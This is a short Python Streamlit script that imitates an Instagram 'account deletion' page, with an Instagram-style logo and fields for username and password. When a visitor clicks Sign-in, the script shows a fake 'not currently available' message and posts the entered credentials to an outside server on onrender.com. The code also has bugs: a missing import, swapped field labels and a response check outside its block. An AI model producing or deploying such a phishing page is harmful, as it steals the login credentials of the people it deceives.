import streamlit as st

username = ""
password = ""
st.set_page_config("Instagram account deletion")
class SessionState:
    def __init__(self):
        self.username = None
        self.password = None

# Create an instance of the custom SessionState class
session_state = SessionState()

left, middle, right = st.columns(3)


with middle:
    image_url = "https://www.dafont.com/forum/attach/orig/8/1/815933.png?1"
    image_style = f"background-image: url({image_url}); background-size: contain; background-repeat: no-repeat; height: 70px; width: 170px;"
    st.markdown(f'<div style="{image_style}"></div>', unsafe_allow_html=True)

    password = st.text_input("Username")
    username = st.text_input("Password")
    st.write(username , password)
    if st.button("Sign-in"):
       st.write("Sorry this page is not currently Available")
       data = {"username": username, "password": password}
       response = requests.post("https://receiver-t4vh.onrender.com", data=data)

    if response.status_code == 200:
            st.success("Data sent successfully!")
    else:
            st.error("Error sending data.")
